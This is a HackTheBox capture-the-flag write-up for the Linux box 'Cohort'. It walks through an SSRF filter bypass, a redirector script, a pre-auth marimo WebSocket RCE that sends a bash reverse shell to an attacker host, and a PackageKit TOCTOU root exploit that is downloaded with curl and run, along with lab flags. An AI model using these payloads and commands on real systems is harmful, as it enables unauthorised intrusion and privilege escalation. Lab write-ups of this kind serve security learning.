---
title: "Cohort — HackTheBox Writeup"
date: 2026-08-02
authors:
  - pexpo
categories:
  - Web Exploitation
  - Linux
tags:
  - easy
  - ssrf
  - marimo
  - cve-2026-39987
  - cve-2026-41651
  - packagekit
  - websocket
  - htb
slug: cohort
description: "SSRF 0.0.0.0 bypass → internal marimo 0.20.4 → CVE-2026-39987 pre-auth RCE → CVE-2026-41651 PackageKit TOCTOU → root"
---

# Cohort — HackTheBox Writeup
**Difficulty:** Easy | **OS:** Linux

<!-- more -->

## Overview

Cohort chains two CVEs through an SSRF. The attack runs: SSRF filter bypass → internal marimo discovery → pre-auth RCE via unauthenticated WebSocket terminal (CVE-2026-39987) → PackageKit TOCTOU LPE (CVE-2026-41651) → root.

**Machine IP:** 10.129.2.10
**User flag:** 742d9b37cd56b755b05884a10466cd75
**Root flag:** cbc1adb617443fe59420c561564ef93c

---

## Recon

```bash
nmap -A -T4 -p- --min-rate 5000 10.129.2.10 -oN scans.txt
echo "10.129.2.10 cohort.htb" | sudo tee -a /etc/hosts
```

Ports 22, 80 (redirects HTTPS), 443. SSL cert leaks `*.cohort.htb` wildcard.

---

## SSRF Discovery

`https://cohort.htb/` is a "Register a report source URL" form that fetches URLs and reflects the body. Quick callback confirms SSRF.

---

## Filter Bypass — 0.0.0.0

The blocklist catches `127.0.0.1` and `localhost` but misses `0.0.0.0` which resolves to loopback on Linux.

| URL | Result |
|-----|--------|
| `http://127.0.0.1/` | Blocked |
| `http://0.0.0.0/` | Returns internal SPA |

---

## Internal Discovery + Redirect Bypass

```bash
# run a 302 redirector to hit any internal URL
python3 -c '
import http.server,socketserver,urllib.parse
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        t=urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query).get("t",[""])[0]
        self.send_response(302);self.send_header("Location",t);self.end_headers()
    def log_message(self,*a): pass
socketserver.TCPServer(("0.0.0.0",80),H).serve_forever()
'
```

Probing internal ports via `http://[::ffff:7f00:1]:8888/api/version` → **marimo 0.20.4** (CVE-2026-39987).

Found `nb-1be3782a8afd3ad5.cohort.htb` vhost from Discord — nginx proxies it directly to internal marimo including WebSocket upgrades.

```bash
echo "10.129.2.10 nb-1be3782a8afd3ad5.cohort.htb" | sudo tee -a /etc/hosts
```

---

## Foothold — CVE-2026-39987

`/terminal/ws` skips authentication entirely — forks a PTY shell directly.

```python
import websocket, time
ws = websocket.WebSocket(sslopt={"cert_reqs": 0})
ws.connect("wss://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws")
time.sleep(2)
ws.send("bash -c 'bash -i >& /dev/tcp/<IP>/9001 0<&1 2>&1'\n")
time.sleep(20)
```

```bash
rlwrap nc -lvnp 9001
python3 exploit.py
```

Shell as `marimo`.

---

## User Flag

```bash
cat ~/user.txt
742d9b37cd56b755b05884a10466cd75
```

---

## Privilege Escalation — CVE-2026-41651

PackageKit 1.2.8 (vulnerable ≤ 1.3.4). Three bugs chain into a TOCTOU:

1. `InstallFiles(SIMULATE, dummy.deb)` → polkit skipped → state = READY
2. `InstallFiles(NONE, payload.deb)` → flags/paths overwritten before GLib idle fires
3. GLib idle dispatches → reads overwritten flags → dpkg installs payload as root
4. Payload postinst → `chmod +s /bin/bash`

```bash
# Kali
git clone https://github.com/Vozec/CVE-2026-41651 && cd CVE-2026-41651
python3 -m http.server 8888

# Target
curl http://<KALI>:8888/cve-2026-41651 -o /tmp/exploit && chmod +x /tmp/exploit
/tmp/exploit
/tmp/.suid_bash -p
```

---

## Root Flag

```bash
cat /root/root.txt
cbc1adb617443fe59420c561564ef93c
```

---

## Things I Learned

**SSRF blocklists always have gaps** — `0.0.0.0`, `0x7f000001`, `127.1`, `[::1]` are all reliable bypasses. Have five candidates before moving on.

**302 redirects bypass URL validation** — when the fetcher follows redirects without re-checking, you get a free proxy to any internal address.

**Notebook servers = RCE by design** — `/terminal/ws` without auth is just a shell. Internal-only binding isn't a security boundary when SSRF exists.

**PackageKit TOCTOU** — the polkit error mid-exploit looks like failure but the race already landed. Read the source, not just the output.
